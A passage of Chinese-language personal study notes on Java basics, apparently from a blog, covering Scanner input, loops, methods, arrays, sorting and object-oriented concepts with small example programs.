s=new Scanner(System.in);</code></pre><h3 id="next-；"><a href="#next-；" class="headerlink" title="next()；"></a>next()；</h3><pre><code class="java">package scanner;import java.util.Scanner;public class Demo01 &#123;    public static void main(String[] args) &#123;         Scanner scanner = new Scanner(System.in);         System.out.println(&quot;用next方式接受：&quot;);         //判断用户有没有输入字符串         if (scanner.hasNext()) &#123;            String str = scanner.next();            System.out.println(&quot;输出内容为：&quot;+str);         &#125;         scanner.close();                //  Next()：        //  1、一定要读取到有效字符后才可以结束输入        //  2、对输入有效字符之前遇到的空白，Next()方法会自动将其去掉        //  3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符        //  4、Next()不能得到带有空格的字符串    &#125;    &#125;</code></pre><h3 id="nextLine-；"><a href="#nextLine-；" class="headerlink" title="nextLine()；"></a>nextLine()；</h3><pre><code class="java">package scanner;import java.util.Scanner;public class Demo02 &#123;    public static void main(String[] args) &#123;        Scanner scanner =new Scanner(System.in);        System.out.println(&quot;使用nextline方式接受：&quot;);        if (scanner.hasNextLine()) &#123;             String str =scanner.nextLine();             System.out.println(&quot;输出字符串为：&quot;+str);        &#125;        scanner.close();        // NextLine()：        // 1、以输入为结束符，也就是说nextLine()方法返回的是输入回车之前的所有字符。        // 2、可以获得空白    &#125;&#125;</code></pre><h3 id="简单加法实例"><a href="#简单加法实例" class="headerlink" title="简单加法实例"></a>简单加法实例</h3><pre><code class="java">package scanner;import java.util.Scanner;public class Demo04 &#123;    public static void main(String[] args) &#123;                Scanner scanner = new Scanner(System.in);                //和        double sum=0;        //计算输入了多少        int m=0;        System.out.println(&quot;请输入要相加的数据，输入非数字结束程序！&quot;);        while (scanner.hasNextDouble()) &#123;            double x=scanner.nextDouble();            m++;            sum+=x;            System.out.println(&quot;你输入了第&quot;+m+&quot;个数据，当前结果sum=&quot;+sum);        &#125;            System.out.println(m+&quot;个数和为&quot;+sum);            System.out.println(m+&quot;个数的平均数为&quot;+(sum/m));            scanner.close();    &#125;&#125;</code></pre><h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><p><strong>一句句执行</strong></p><pre><code class="java">package struct;public class Demo01 &#123;    public static void main(String[] args) &#123;                System.out.println(&quot;hello1&quot;);        System.out.println(&quot;第二个输出&quot;);    &#125;&#125;//hello1// 第二个输出</code></pre><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><blockquote><p>if单选</p><p>if双选</p><p>if多选</p><p>嵌套的if</p><p>switch多结构</p></blockquote><pre><code class="java">package struct;import java.util.Scanner;public class switchDemo03 &#123;    public static void main(String[] args) &#123;                Scanner scanner = new Scanner(System.in);        System.out.println(&quot;请输入A、B、C&quot;);        char grade=scanner.nextLine().charAt(0);                            System.out.println(&quot;这是个swicth例子&quot;);        switch (grade) &#123;            case &#39;A&#39;:                System.out.println(&quot;优秀&quot;);                break;            case &#39;B&#39;:                System.out.println(&quot;良好&quot;);                break;            case &#39;C&#39;:                System.out.println(&quot;及格&quot;);                break;            default:                System.out.println(&quot;输入错了捏&quot;);                break;        &#125;        scanner.close();    &#125;&#125;</code></pre><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="for循环基础"><a href="#for循环基础" class="headerlink" title="for循环基础"></a>for循环基础</h3><pre><code class="java">package struct;public class forDemo01 &#123;        public static void main(String[] args) &#123;        int a=1;        while (a&lt;=100) &#123;                        System.out.println(a);            a+=2;        &#125;        System.out.println(&quot;while循环结束&quot;);        for(int i=1;i&lt;=100;i++)&#123;            System.out.println(i);        &#125;        System.out.println(&quot;for循环结束&quot;);    &#125;&#125;</code></pre><h3 id="一些练习"><a href="#一些练习" class="headerlink" title="一些练习"></a>一些练习</h3><pre><code class="java">package struct;public class forDemo02 &#123;    public static void main(String[] args) &#123;        //0-100奇数和偶数的和        int oddsum=0;        int evensum=0;        for(int i=0;i&lt;=100;i++)&#123;            if(i%2!=0)&#123;//奇数                oddsum+=i;            &#125;else&#123;//偶数                evensum+=i;             &#125;        &#125;        System.out.println(&quot;奇数的和&quot;+oddsum);        System.out.println(&quot;偶数的和&quot;+evensum);     &#125;&#125;</code></pre><pre><code class="java">package struct;public class forDemo03 &#123;    public static void main(String[] args) &#123;        //打印九九乘法表        for(int i=1;i&lt;=9;i++)&#123;            for(int j=1;j&lt;=i;j++)&#123;                System.out.print(j+&quot;*&quot;+i+&quot;=&quot;+(i*j));                System.out.print(&quot;\t&quot;);            &#125;System.out.print(&quot;\n&quot;);        &#125;    &#125;&#125;</code></pre><h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><pre><code class="java">package struct;public class forDemo04 &#123;    public static void main(String[] args) &#123;//增强for循环                int[] number =&#123;10,20,30,40,50&#125;;    for(int x:number)&#123;        System.out.println(x);    &#125;&#125;&#125;</code></pre><h2 id="break-continue"><a href="#break-continue" class="headerlink" title="break &amp; continue"></a>break &amp; continue</h2><blockquote><p>while</p><p>do…while</p><p>for循环</p></blockquote><p>没啥意思，例子在上面</p><h2 id="一些练习题"><a href="#一些练习题" class="headerlink" title="一些练习题"></a>一些练习题</h2><p>皇帝的新练习题</p><h1 id="java方法"><a href="#java方法" class="headerlink" title="java方法"></a>java方法</h1><h2 id="什么是方法"><a href="#什么是方法" class="headerlink" title="什么是方法"></a>什么是方法</h2><pre><code class="java">System.out,println(); //类.对象.方法</code></pre><p>语句的集合，执行一个功能</p><p>命名规则，除了规则外，随便吧</p><p>类似其他语言函数自定义</p><h2 id="方法的定义以及调用"><a href="#方法的定义以及调用" class="headerlink" title="方法的定义以及调用"></a>方法的定义以及调用</h2><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><pre><code class="java">//看个例子package method;public class Demo01 &#123;      public static void main(String[] args) &#123;        int sum= add(1,2);        System.out.println(sum);    &#125;    //加法      public static int add(int a,int b)      &#123;        return a+b;    &#125;        &#125;</code></pre><h3 id="实参、形参"><a href="#实参、形参" class="headerlink" title="实参、形参"></a>实参、形参</h3><pre><code class="java">package method;public class Demo01 &#123;      public static void main(String[] args) &#123;        int sum= add(1,2);        System.out.println(sum);    &#125;    //加法      public static int add(int a,int b)      &#123;                  return a+b;      &#125;   &#125;</code></pre><p>a，b为实参</p><p>不返回的为形参（有tm一种学c语言的感觉</p><h3 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h3><pre><code class="java">package method;public class Demo02 &#123;    public static void main(String[] args) &#123;        int max=MAX(10,10);        System.out.println(max);    &#125;    public static int MAX(int num1,int num2)&#123;        int result = 0;        if (num1==num2) &#123;            System.out.println(&quot;num1=num2&quot;);            return 0;//终止方法                    &#125;        if (num1&gt;num2) &#123;            result = num1;        &#125;else&#123;            result = num2;        &#125;        return result;     &#125;&#125;</code></pre><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>在一个类中，相同的名字，但是参数类型不同</p><pre><code class="java">    public static int MAX(int num1,int num2)&#123;        int result = 0;        if (num1==num2) &#123;            System.out.println(&quot;num1=num2&quot;);            return 0;//终止方法                    &#125;        if (num1&gt;num2) &#123;            result = num1;        &#125;else&#123;            result = num2;        &#125;        return result;    &#125;    public static double MAX(double num1,double num2)&#123;        double result = 0;        if (num1==num2) &#123;            System.out.println(&quot;num1=num2&quot;);            return 0;//终止方法                    &#125;        if (num1&gt;num2) &#123;            result = num1;        &#125;else&#123;            result = num2;        &#125;                return result; &#125;    </code></pre><h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><p>没啥意思</p><p>命令行</p><p>先编译</p><p>java 包.Demo01 hello world</p><p>输出</p><p>args[0]hello</p><p>args[1]world</p><pre><code class="java">package method;public class Demo03 &#123;    public static void main(String[] args) &#123;        for (int i = 0; i &lt; args.length; i++) &#123;            System.out.println(&quot;args[&quot;+i+&quot;]&quot;+args[i]);        &#125;    &#125;&#125;</code></pre><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><pre><code class="java">package method;public class Demo04 &#123;        public static void main(String[] args) &#123;//可变参数                printMAX(34,2,34,34324,67);        printMAX(new double[]&#123;1,2,4&#125;);    &#125;    public static void printMAX(double... number)&#123;        if (number.length == 0) &#123;            System.out.println(&quot;没啥东西&quot;);             return;        &#125;        double result = number[0];        //排序        for (int i = 0; i &lt; number.length; i++) &#123;            if (number[i]&gt; result) &#123;                result=number[i];            &#125;        &#125;        System.out.println(&quot;最大的数为：&quot;+result);    &#125;&#125;</code></pre><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p><strong>自己调用自己，能不用就不用</strong></p><pre><code>package method;public class Demo05 &#123;    //递归，调用栈比较多，大运算容易寄，能不用就不用    public static void main(String[] args) &#123;                //递归        //递归头        //递归体        System.out.println(f(3));    &#125;    //递归实现阶乘    public static int f(int n)&#123;        if (n==1) &#123;            return 1;        &#125;else&#123;            return n*f(n-1);        &#125;        // return 0;    &#125;&#125;</code></pre><h2 id="小作业，计算器"><a href="#小作业，计算器" class="headerlink" title="小作业，计算器"></a>小作业，计算器</h2><blockquote><p>写四个方法：加减乘除</p><p>循环+switch进行用户交互</p><p>传递需要操作的两个数</p><p>输出结果</p></blockquote><p>皇帝的新计算器</p><pre><code class="java"></code></pre><h1 id="java数组"><a href="#java数组" class="headerlink" title="java数组"></a>java数组</h1><h2 id="数组概述"><a href="#数组概述" class="headerlink" title="数组概述"></a>数组概述</h2><blockquote><p>相同数据有序集合</p><p>其中每一个数据成为数组元素</p></blockquote><h2 id="数组声明创建"><a href="#数组声明创建" class="headerlink" title="数组声明创建"></a>数组声明创建</h2><pre><code class="java">package array;public class arrayDemo01 &#123;    public static void main(String[] args) &#123;        int[]a=&#123;1,2,3,4,5,6&#125;;//创建 + 赋值，静态初始化        int[] nums;//定义，动态初始化        nums = new int[3];        nums[0]=1;        nums[1]=2;        nums[2]=4;        System.out.println(&quot;数组例子&quot;);        for (int i = 0; i &lt; a.length; i++) &#123;            System.out.println(a[i]);        &#125;        for (int i = 0; i &lt; nums.length; i++) &#123;            System.out.println(nums[i]);        &#125;    &#125;&#125;</code></pre><h3 id="内存分析一下"><a href="#内存分析一下" class="headerlink" title="内存分析一下"></a>内存分析一下</h3><h3 id="数组边界"><a href="#数组边界" class="headerlink" title="数组边界"></a><strong>数组边界</strong></h3><pre><code class="java">package array;public class arrayDemo01 &#123;    public static void main(String[] args) &#123;                int[] nums;//定义，声明数组        nums = new int[3];//创建数组        //赋值        nums[0]=1;        nums[1]=2;        nums[2]=4;        System.out.println(&quot;数组例子&quot;);        //输出        for (int i = 0; i &lt; nums.length; i++) &#123;            System.out.println(nums[i+1]);        &#125;    &#125;&#125;</code></pre><p>这里修改<code>nums[i]</code>为<code>nums[i+1]</code>导致数组下标越界报错</p><pre><code>java.lang.ArrayIndexOutOfBoundsException: 3</code></pre><p>数组下标越界</p><h3 id="数组小结"><a href="#数组小结" class="headerlink" title="数组小结"></a>数组小结</h3><ol><li>长度确定，创建后大小不可改变</li><li>单一类型</li><li>可以是任何类型</li><li>数组也可看成对象</li></ol><h2 id="数组使用"><a href="#数组使用" class="headerlink" title="数组使用"></a>数组使用</h2><ol><li><p>For-Each 循环</p><pre><code class="java">package array;public class arrayDemo02 &#123;    public static void main(String[] args) &#123;                int[] array = &#123;1,2,3,4,5&#125;;        //打印数组所有元素        for (int i = 0; i &lt; array.length; i++) &#123;            System.out.println(array[i]);        &#125;        //计算所有元素和        int sum = 0;        for (int i = 0; i &lt; array.length; i++) &#123;            sum+=array[i];        &#125;        System.out.println(sum);        //查找最大的数        int max=array[0];        for (int i = 1; i &lt; array.length; i++) &#123;            if (array[i]&gt;max) &#123;                max=array[i];                            &#125;        &#125;        System.out.println(max);    &#125;&#125;</code></pre><pre><code class="java">package array;public class arrayDemo03 &#123;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4,5&#125;;        for(int a:arr)&#123;            System.out.print(a+&quot; &quot;);        &#125;    &#125;&#125;</code></pre></li><li><p>数组作方法入参</p></li><li><p>数组作返回值</p></li></ol><pre><code class="java">package array;public class arrayDemo03 &#123;    public static void main(String[] args) &#123;        int[] arr = &#123;1,2,3,4,5&#125;;        for(int a:arr)&#123;            System.out.print(a+&quot; &quot;);        &#125;        System.out.println(&quot;========&quot;);        printArray(reverse(arr));    &#125;    //打印数组    public static void printArray(int[] arr)&#123;        for (int i = 0; i &lt; arr.length; i++) &#123;            System.out.print(arr[i]+&quot; &quot;);        &#125;    &#125;    //反转数组    public static int[] reverse(int[] arr)&#123;        int[] result = new int[arr.length];        //反转的操作        for (int i = 0,j = result.length-1; i &lt; arr.length; i++,j--) &#123;            result[j]=arr[i];        &#125;        return result;    &#125;&#125;</code></pre><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>数组嵌套</p><pre><code class="java">package array;//多维数组public class arrayDemo04 &#123;    public static void main(String[] args) &#123;        int[][] array =&#123;&#123;1,2&#125;,&#123;3,4&#125;,&#123;5,6&#125;&#125;;        System.out.println(array[2][0]);        for (int i = 0; i &lt; array.length; i++) &#123;            for (int j = 0; j &lt; array[i].length; j++) &#123;                System.out.print(array[i][j]+&quot; &quot;);            &#125;        &#125;    &#125;&#125;</code></pre><h2 id="Arrays类"><a href="#Arrays类" class="headerlink" title="Arrays类"></a>Arrays类</h2><pre><code class="java">package array;import java.util.Arrays;public class arrayDemo05 &#123;    public static void main(String[] args) &#123;                int[] array =&#123;1,23,6,45,3,5,45&#125;;        System.out.println(array);//[I@15db9742        //打印数组元素,不要重复造轮子        System.out.println(Arrays.toString(array));//[1, 23, 6, 45, 3, 5, 45]        //排序类        Arrays.sort(array);//升序排序        System.out.println(Arrays.toString(array));//[1, 3, 5, 6, 23, 45, 45]        //数组填充        Arrays.fill(array, 1,3,0);//1-3之间填充，即1和2,不包括3        System.out.println(Arrays.toString(array));    &#125;&#125;</code></pre><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><pre><code class="java">package array;    //冒泡排序    //1.两个相邻的元素，第一个比第二个大，就交换    //2.每一次比较，都会选出来最大，或者最小的数    //3.下一轮减少一次排序    //4.循环直到结束import java.util.Arrays;public class arrayDemo06 &#123;    public static void main(String[] args) &#123;        int[] a=&#123;1,2,4,5,8,7,5,34,2,&#125;;        int[] sort = sort(a);        System.out.println(Arrays.toString(sort));        &#125;    public static int[] sort(int[] array)&#123;        //临时变量        int temp = 0;//temp这里就是形参        //外层循环，判断要走多少次        for (int i = 0; i &lt; array.length-1; i++) &#123;            boolean flag =false;//加一个标志位优化判断，如果不比较就break            //内层循环，判断俩数大小，交换位置            for (int j = 0; j &lt; array.length-1-i; j++) &#123;                if (array[j+1]&gt;array[j]) &#123;//降序排序，升序修改为array[j+1]&lt;array[j]                    temp = array[j];                    array[j]=array[j+1];                    array[j+1]=temp;                    flag = true;//如果比较就为true                &#125;            &#125;            if (!flag) &#123;                break;            &#125;        &#125;        return array;    &#125;&#125;</code></pre><h2 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h2><pre><code class="java">package array;//稀疏数组//数组中大部分为0或者相同的数据public class arrayDemo07 &#123;    public static void main(String[] args) &#123;        //1.创建一个数组 11 * 11 0：没有棋子  1：黑棋  2：白棋        int[][] array1 = new int[11][11];        array1[1][2] = 1;        array1[2][3] = 1;        //输出原始数组        System.out.println(&quot;原始数组&quot;);        for (int[] is : array1) &#123;            for (int is2 : is) &#123;                System.out.print(is2+&quot;\t&quot;);            &#125;System.out.println();        &#125;        //转化为稀疏数组保存        // 1,获取有效值的个数        int sum = 0;        for (int i = 0; i &lt; array1.length; i++) &#123;            for (int j = 0; j &lt; array1[i].length; j++) &#123;                if (array1[i][j]!=0) &#123;                    sum++;                &#125;            &#125;        &#125;        System.out.println(&quot;有效值个数：&quot;+sum);        //创建一个稀疏数组        int[][] array2 = new int[sum+1][3];        array2[0][0] = array1.length;        array2[0][1] = array1[0].length;        array2[0][2] = sum;        //遍历二维数组，把非零值放入稀疏数组        int count = 0;        for (int i = 0; i &lt; array1.length; i++) &#123;            for (int j = 0; j &lt; array1[i].length; j++) &#123;                if (array1[i][j]!=0) &#123;                    count++;                    array2[count][0] = i;//稀疏数组的第一列的第count列放的是原来数组的行                    array2[count][1] = j;//第二列放的原来的列数                    array2[count][2] = array1[i][j];//第三列放数据                &#125;            &#125;        &#125;        System.out.println(&quot;稀疏数组&quot;);        for (int i = 0; i &lt; array2.length; i++) &#123;            System.out.println(array2[i][0]+&quot;\t&quot;            +array2[i][1]+&quot;\t&quot;            +array2[i][2]+&quot;\t&quot;            );        &#125;        System.out.println(&quot;稀疏数组还原&quot;);        //读取稀疏数组        int[][] array3 = new int[array2[0][0]][array2[0][1]];        //还原值        for (int i = 1; i &lt; array2.length; i++) &#123;            array3[array2[i][0]][array2[i][1]] = array2[i][2];        &#125;        System.out.println(&quot;还原数组&quot;);        for (int[] is : array3) &#123;            for (int is2 : is) &#123;                System.out.print(is2+&quot;\t&quot;);            &#125;System.out.println();        &#125;    &#125;&#125;</code></pre><h1 id="Javaoop"><a href="#Javaoop" class="headerlink" title="Javaoop"></a>Javaoop</h1><h2 id="初识面向对象"><a href="#初识面向对象" class="headerlink" title="初识面向对象"></a>初识面向对象</h2><p>面向对象，类似总分</p><p>“分”里面还要面向过程（也就是第一步做什么第二步做什么</p><p><strong>OOP</strong>:面向对象编程</p><p><strong>本质</strong>：以类的方式组织代码，以对象的组织（封装）数据（什么绕口的本质</p><p><strong>特性</strong></p><ul><li>封装：也就是封装（</li><li>继承：子类继承父类</li><li>多态：抽象，看例子吧</li></ul><h2 id="方法回顾和加深"><a href="#方法回顾和加深" class="headerlink" title="方法回顾和加深"></a>方法回顾和加深</h2><h3 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h3><pre><code class="java">package oop;//方法定义public class Demo01 &#123;    //main 方法    public static void main(String[] args) &#123;        /*         * 修饰符 返回值类型 方法名(...)&#123;                //方法体                return 返回值;            &#125;         */    //return  结束方法，返回一个结果    &#125;    public String sayHeloo()&#123;        //方法体        return &quot;hello,world&quot;;//这里返回hello，world        &#125;    public int max(int a,int b)&#123;//这里a,b为形参        //三元运算符        return a&gt;b ? a : b;//这里返回结果    &#125;    public void print()&#123;        return;//返回类型，这里返回空    &#125;    &#125;</code></pre><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>与非静态的例子放在一起了</p><h3 id="非静态方法"><a href="#非静态方法" class="headerlink" title="非静态方法"></a>非静态方法</h3><pre><code class="java">package oop;public class Student &#123;        public void say()&#123;//非静态类，不加static        System.out.println(&quot;学生说话了！&quot;);    &#125;    //static 和类一起加载    public static void jiao()&#123;//静态类，直接调用        System.out.println(&quot;学生叫起来了！&quot;);        //一个存在的调用一个不存在的，调用会报错        //b();    &#125;    public void b()&#123;//类实例化之后才存在    &#125;&#125;</code></pre><h3 id="形参与实参"><a href="#形参与实参" class="headerlink" title="形参与实参"></a>形参与实参</h3><pre><code class="java">package oop;//形参实参public class Demo03 &#123;    public static void main(String[] args) &#123;        int max = Demo03.add(1,2);//其中1和2为实参        System.out.println(max);    &#125;    public static int add(int a,int b)&#123;//其中a,b为形参        return a+b;    &#125;&#125;//3</code></pre><h3 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h3><pre><code class="java">package oop;//值传递public class Demo04 &#123;    public static void main(String[] args) &#123;        int a = 1;        System.out.println(a);        change(a);        System.out.println(a);    &#125;    public static void change(int a)&#123;        a=10;//没有返回值，所有a没有变化    &#125;&#125;//1</code></pre><h3 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h3><pre><code class="java">package  oop;//引用传递：对象，本质还是值传递public class Demo05 &#123;    public static void main(String[] args) &#123;        Person person = new Person();        System.out.println(person.name);                Demo05.change(person);        System.out.println(person.name);    &#125;public static void change(Person person)&#123;    //person是一个对象：指向的Person person = new Person();这是一个具体的人，可以改变属性    person.name = &quot;菜狗&quot;;&#125;&#125;//定义一个Person类，有一个属性：nameclass Person &#123;    String name;    &#125;//null//菜狗</code></pre><h2 id="对象的创建分析"><a href="#对象的创建分析" class="headerlink" title="对象的创建分析"></a>对象的创建分析</h2><h3 id="类与对象的关系"><a href="#类与对象的关系" class="headerlink" title="类与对象的关系"></a>类与对象的关系</h3><blockquote><p>类是一种抽象的数据类型，对某一类事务整体描述，并不能代表某一个具体的事物</p><p>对象是抽象概念的具体实例</p></blockquote><h3 id="创建student类"><a href="#创建student类" class="headerlink" title="创建student类"></a>创建student类</h3><pre><code class="java">package oop.demo02;//学生类public class student &#123;    //属性：字段    String name;//默认是null    int age;//默认是0    //方法    public void study()&#123;        System.out.println(this.name+&quot;在学习！&quot;);    &#125;&#125;</code></pre><h3 id="new创建对象"><a href="#new创建对象" class="headerlink" title="new创建对象"></a>new创建对象</h3><pre><code class="java">package oop.demo02;public class application &#123;    public static void main(String[] args) &#123;        //类：抽象的，需要实例化        //类实例化后会返回一个自己的对象        //xiaomin 就是一个student类的具体实例        student xm = new student();//这里new的是前面的类，也就是实例化        student xh = new student();        xm.name=&quot;小明&quot;;        xm.age = 3;        xh.name = &quot;小红&quot;;        xh.age = 4;        System.out.println(xm.name);        System.out.println(xm.age);        System.out.println(xh.name);        System.out.println(xh.age);        //这里赋值/*小明3小红4 */    &#125;&#125;</code></pre><h3 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h3><p>一个类即使什么都不写，也会存在一个方法</p><p>显示的定义构造器</p><p><strong>作用：实例化初始值</strong></p><ol><li><p>使用new 关键字，必须要有构造器</p><pre><code class="java">public person()&#123;    this.name = &quot;cc&quot;;&#125;</code></pre></li><li><p>有参构造：一旦定义了有参构造，无参就必须显示定义</p><pre><code class="java">public person(String name)&#123;    this.name = name;&#125;</code></pre></li></ol><p>new对象的时候 会调用构造器</p><pre><code class="java">person ren = new person(&quot;shigeren&quot;);</code></pre><p><strong>这里会直接调用有参构造类</strong></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><ol><li>类与对象<ul><li>类是一个模板:抽象，对象是一个县体的实例</li></ul></li><li>方法<ul><li>定义，调用</li></ul></li><li>对应的引用<ul><li>引用类型：基本类型（8）</li><li>对象是通过引用来操作的：栈 –&gt; 堆</li></ul></li><li>属性：字符field 成员变量<ul><li>默认初始值：<ul><li>数字： 0或者0.0</li><li>char: u0000</li><li>boolean: false</li><li>引用：null</li></ul></li></ul></li><li>对象的创建和使用<ul><li>必须使用new 关键字 ，构建器 person caigou &#x3D; new person();</li><li>对象的属性 caigou.name</li><li>对象的方法 caigou.shout()</li></ul></li><li>类<ul><li>静态的属性 属性</li><li>动态的行为 方法</li></ul></li><li>封装、继承、多态</li></ol><h2 id="面向对象的三大特性"><a href="#面向对象的三大特性" class="headerlink" title="面向对象的三大特性"></a>面向对象的三大特性</h2><h3 id="第一个特性’封装‘"><a href="#第一个特性’封装‘" class="headerlink" title="第一个特性’封装‘"></a>第一个特性’封装‘</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p><strong>高内聚，低耦合</strong></p><blockquote><p>内部细节自己完成</p><p>仅暴露少量接口给外部</p><p>属性私有，get&#x2F;set</p></blockquote><pre><code class="java">package oop.demo04;//封装，私有 private :私有public class student &#123;    private String name;//名字    private int id;//学号    private char sex;//性别    //提供一些可以操作这个属性的方法！    //提怪一些public 的 get set方法    //get  获得这个数据    public String getName()&#123;        return this.name;    &#125;    //set 给这个数据设置值    public void setName(String name)&#123;        this.name = name;    &#125;&#125;</code></pre><h4 id="封装的类"><a href="#封装的类" class="headerlink" title="封装的类"></a>封装的类</h4><pre><code class="java">package oop.demo04;/*1.提高程序的安全性，保护数据 *2.隐藏代码的实现细节 3.统一接口 4.系统的可维护性增加了 */public class application &#123;    public static void main(String[] args) &#123;               student s1 = new student();    s1.setName(&quot;caigou&quot;);    System.out.println(s1.getName());         &#125;    &#125;</code></pre><h3 id="第二个特性’继承‘"><a href="#第二个特性’继承‘" class="headerlink" title="第二个特性’继承‘"></a>第二个特性’继承‘</h3><p>本质：对某一批类的抽象</p><h4 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h4><p><strong>扩展的意思，子类是父类的扩展</strong></p><ul><li><p>就子类继承父类的东西的意思</p></li><li><p>java只有单继承，没有多继承</p></li><li><p>java中所有的类，都默认直接或者间接继承Object类</p></li></ul><h4 id="父类"><a href="#父类" class="headerlink" title="父类"></a>父类</h4><p>person</p><pre><code class="java">package oop.demo04;// person 人public class person &#123;        private int money = 10_0000_0000;    public void say()&#123;        System.out.println(&quot;shuoleyijuhua&quot;);    &#125;    public int getMoney()&#123;        return money;    &#125;    public void setMoney(int money)&#123;        this.money = money;    &#125;&#125;</code></pre><h4 id="继承的例子"><a href="#继承的例子" class="headerlink" title="继承的例子"></a>继承的例子</h4><p><img src="/../../themes/3-hexo/source/img/image-20231031192120631.png" alt="image-20231031192120631"></p><h4 id="无参构造"><a href="#无参构造" class="headerlink" title="无参构造"></a>无参构造</h4><p><img src="/../../themes/3-hexo/source/img/image-20231031192347444.png" alt="image-20231031192347444"></p><p>调用父类构造器的时候，必须放在子类构造器的第一行</p><p><img src="/../../themes/3-hexo/source/img/image-20231031192519676.png" alt="image-20231031192519676"></p><p><strong>父类写了有参构造，那么子类就没办法调用无参构造</strong></p><h4 id="super注意点"><a href="#super注意点" class="headerlink" title="super注意点"></a>super注意点</h4><ol><li>super调用父类的构造方法，必须在构造方法的第一个</li><li>super必须只能出现在子类或者构造方法中</li><li>super和this不能同时调用构造方法</li></ol><p>比较 this:</p><ol><li>代表的对象不同<ol><li>this: 本身调用者这个对象</li><li>super： 代表父类对象的应用</li></ol></li><li>前提<ol><li>this: 没有继承也可以使用</li><li>super:只能在继承条件下可以使用</li></ol></li><li>构造方法<ol><li>this(): 本来的构造</li><li>super() :父类的构造</li></ol></li></ol><h4 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h4><p><strong>重写都是方法的重写</strong></p><p>需要有继承关系，子类重写父类的方法</p><ol><li>方法名必须相同</li><li>参数列表必须相同</li><li>修饰符:范围可以扩大：public&gt;protected&gt;private</li><li>报错：范围，可以被缩小，但不能扩大。ClassNOTfoundException —&gt; Exception(大)</li></ol><p>重写，子类的方法和父类必须要一致，方法体不同</p><p>为什么重写</p><ol><li>父类的功能，子类不一定需要，或者不一定满足</li><li>override 重写</li></ol><h3 id="第三个特性“多态”"><a href="#第三个特性“多态”" class="headerlink" title="第三个特性“多态”"></a>第三个特性“多态”</h3><p>动态编译：类型：可扩展性</p><pre><code class="java">package oop.demo06;public class person &#123;    public void run()&#123;        System.out.println(&quot;run&quot;);    &#125;&#125;</code></pre><pre><code class="java">package oop.demo06;public class student extends person&#123;        @Override    public void run()&#123;        System.out.println(&quot;son&quot;);    &#125;    public void eat()&#123;        System.out.println(&quot;eat&quot;);    &#125;&#125;</code></pre><pre><code class="java">package oop.demo06;public class apalication &#123;    public static void main(String[] args) &#123;        //一个对象的实际类型是确定的        //new student();        //new person();        //可以指向的引用类型就不确定了        //student 能调用的方法都是自己的或者继承父类的        student s1 = new student();        //person 父类，可以指向子类，但是不能调用子类独有的方法        person s2 = new student();//父类的引用指向子类        Object s3 = new student();                s2.run();        s1.run();//子类重写了父类的方法，执行子类的方法        //对象执行那些方法，主要看对象左边的类型，和右边关系不大        s1.eat();        // s2.eat();    &#125;&#125;</code></pre><h4 id="多态注意事项"><a href="#多态注意事项" class="headerlink" title="多态注意事项"></a>多态注意事项</h4><blockquote><ol><li>多态是方法的多态，属性没有多态</li><li>父类和子类，有联系 ，类型转化异常！ClassCastException!</li><li>存在条件：继承关系，方法需要重写，父类引用指向子类对象！ father f1 &#x3D; new son();<ol><li>static 方法，属于类，不属于实例</li><li>final 常量</li><li>private 方法：</li></ol></li></ol></blockquote><h4 id="instanceof-类型转化"><a href="#instanceof-类型转化" class="headerlink" title="instanceof 类型转化"></a><strong>instanceof 类型转化</strong></h4><p><strong>转换引用类型</strong></p><pre><code class="java">package oop.demo06;import oop.demo04.teach;public class apalication &#123;    public static void main(String[] args) &#123;        //instanceof 关键字        //Object &gt; String        //Object &gt; person &gt; teacher        //Object &gt; person &gt; student        //有关系的        Object foo = new student();                System.out.println(foo instanceof student);//t        System.out.println(foo instanceof person);//t        System.out.println(foo instanceof Object);//t        System.out.println(foo instanceof teacher);//f        System.out.println(foo instanceof String);//f        System.out.println(&quot;=====================================&quot;);        person foo2 = new student();        //person可能是student,可能是person,可能是Object,但是不一定未teach        //这里看的是继承关系        System.out.println(foo2 instanceof student);//t        System.out.println(foo2 instanceof person);//t        System.out.println(foo2 instanceof Object);//t        System.out.println(foo2 instanceof teacher);//f        // System.out.println(foo2 instanceof String);//编译就报错    &#125;</code></pre><h4 id="类型转化-父–-子"><a href="#类型转化-父–-子" class="headerlink" title="类型转化 父–&gt;子"></a>类型转化 父–&gt;子</h4><blockquote><ol><li>父类引用指向子类的对象</li><li>把子类转化为父类，向上转型</li><li>把父类转化为子类，向下转型，强制转化</li><li>方便方法的调用，减少重复的代码，简洁</li></ol></blockquote><h4 id="static关键词"><a href="#static关键词" class="headerlink" title="static关键词"></a>static关键词</h4><pre><code class="java">package oop.demo07;//静态导入包import static java.lang.Math.random;public class sperson &#123;        &#123;//第二个输出        //代码块（匿名代码块）        System.out.println(&quot;代码块（匿名代码块）&quot;);    &#125;    static&#123;//第一个输出        //静态代码块        